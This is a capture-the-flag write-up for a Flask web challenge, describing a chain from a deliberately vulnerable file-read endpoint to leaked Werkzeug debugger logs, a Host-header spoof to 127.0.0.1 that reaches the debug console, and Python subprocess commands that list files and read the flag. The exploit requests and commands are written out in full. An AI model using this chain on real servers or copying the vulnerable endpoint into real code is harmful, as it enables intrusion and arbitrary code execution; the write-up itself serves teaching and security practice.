### **Mola7ada Revenge Write-Up**

## discription 

mo7adata was mid i beet you solve this one :) , Revenge baby ;)

## flag 
CTF{machakil_f_ta7mil}

## Write-up 

After obtaining the zip file, I noticed the following line in the Dockerfile:

```dockerfile
CMD flask run --host=0.0.0.0 > /app/logs/logs.txt 2>&1
```

This command redirects the Flask application's output to `/app/logs/logs.txt`. On the host machine, the logs are saved in `./logs/logs.txt`.

During my analysis, I discovered a vulnerability in the following endpoint:

```python
@auth.route('/get_profile_pic')
def file():
    filename = request.args.get('filename')
    try:
        with open(filename, 'r') as f:
            return f.read()
    except:
        return 'error'
```

This endpoint is vulnerable to **Local File Inclusion (LFI)**, which allows reading arbitrary files on the server. However, the flag file is randomized using the following command:

```dockerfile
RUN FLAG_NAME=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12) && mv ./flag.txt "./${FLAG_NAME}_flag.txt"
```

This makes it difficult to guess the flag file's name directly.

---

### **Exploiting the LFI Vulnerability**

After some testing, I found that I could read the application logs using the LFI vulnerability:

```
http://192.168.11.113:5000/get_profile_pic?filename=./logs/logs.txt
```

The output revealed the following:

```
* Serving Flask app 'app.py' 
* Debug mode: on 
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. 
* Running on all addresses (0.0.0.0) 
* Running on http://127.0.0.1:5000 
* Running on http://192.168.11.113:5000 
Press CTRL+C to quit 
* Restarting with stat 
* Debugger is active! 
* Debugger PIN: 630-138-255
```

The logs show that the Flask debugger is active, and the **Debugger PIN** is exposed. This is a critical finding because the debugger allows arbitrary code execution if accessed.

---

### **Accessing the Werkzeug Console**

I attempted to access the Werkzeug console at:

```
http://192.168.11.113:5000/console
```

However, I received the following error:

```
Bad Request
The browser (or proxy) sent a request that this server could not understand.
```

After two days of research and testing various attack vectors (including SSRF), I discovered that the `/console` endpoint is restricted to `localhost` and `127.0.0.1`. It is not accessible from external IP addresses.

---

### **Bypassing the Restriction**

To bypass this restriction, I modified the `Host` header in my HTTP request. By changing the `Host` from `192.168.11.113:5000` to `127.0.0.1`, I was able to access the Werkzeug console.

Here’s the modified request:

```
GET /console HTTP/1.1
Host: 127.0.0.1
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: __wzd7996cd05d8d38c9847ad=1737926290|efd2461c3eb9
Connection: keep-alive
```

This allowed me to access the Werkzeug console and execute arbitrary Python code.

---

### **Gaining Remote Code Execution (RCE)**

Using the Werkzeug console, I executed the following commands to enumerate the file system and retrieve the flag:

```python
>>> import subprocess
>>> print(subprocess.run("ls -la", shell=True, text=True, capture_output=True).stdout)
```

The output revealed the contents of the current directory, including the randomized flag file:

```
total 68
drwxr-xr-x 1 root root 4096 Jan 26 21:15 .
dr-xr-xr-x 1 root root 4096 Jan 26 21:15 ..
drwxrwxrwx 7 root root 4096 Jan 24 23:14 .git
drwxrwxrwx 3 root root 4096 Jan 24 23:14 .idea
drwxrwxrwx 5 root root 4096 Jan 24 23:14 .venv
-rw-rw-r-- 1 root root  733 Jan 26 04:04 08WrSq8rM2dL_flag.txt
-rw-rw-rw- 1 root root  346 Aug  9 23:09 Bloog.iml
-rw-rw-rw- 1 root root  787 Jan 26 21:15 Dockerfile
drwxrwxrwx 1 root root 4096 Jan 26 21:15 __pycache__
-rw-rw-rw- 1 root root  128 Jan 26 20:34 app.py
-rwxrwxrwx 1 root root  358 Jan 26 21:05 build.sh
drwxrwxrwx 1 root root 4096 Jan 26 20:20 instance
drwxrwxr-x 2 root root 4096 Jan 26 21:11 logs
drwxrwxrwx 4 root root 4096 Jan 24 23:14 migrations
-rw-rw-rw- 1 root root  101 Jan 25 23:58 requirements.txt
drwxrwxr-x 5 root root 4096 Jan 26 01:56 venv
drwxrwxrwx 1 root root 4096 Jan 24 23:14 website
```

Next, I read the contents of the flag file:

```python
>>> print(subprocess.run("cat 08WrSq8rM2dL_flag.txt", shell=True, text=True, capture_output=True).stdout)
```

The flag file contained the following message:

```
It's 5 AM, and this challenge has made me furious.
I spent all day trying to build a nice Werkzeug pin bypass challenge, 
but I found out that `/console` isn’t accessible from outside of localhost.

I tried so many things—one of them was an SSRF attempt to interact with the console and achieve RCE.

Honestly, this challenge feels mediocre; it could be solved in 5 minutes or even with ChatGPT.
Sorry for wasting your time, but if you’re curious about what I was trying to do, check out these resources :  
- https://werkzeug.palletsprojects.com/en/1.0.x/debug/       
- https://www.daehee.com/werkzeug-console-pin-exploit/    

Here is your flag:
CTF{machakil_f_ta7mil}
```

---

### **Conclusion**

This challenge highlighted the dangers of leaving the Flask debugger enabled in a production environment. By exploiting the LFI vulnerability and bypassing the Werkzeug console's IP restriction, I was able to achieve Remote Code Execution (RCE) and retrieve the flag.

**Note to the Developer: molzri3**  
This is the first time I’ve encountered a way to bypass the Werkzeug console's IP restriction. I plan to report this issue to the Werkzeug maintainers for further investigation. I hope you enjoyed playing this challenge as much as I did!

---

### **References**

- [Werkzeug Debugger Documentation](https://werkzeug.palletsprojects.com/en/1.0.x/debug/)
- [Werkzeug Console PIN Exploit](https://www.daehee.com/werkzeug-console-pin-exploit/)
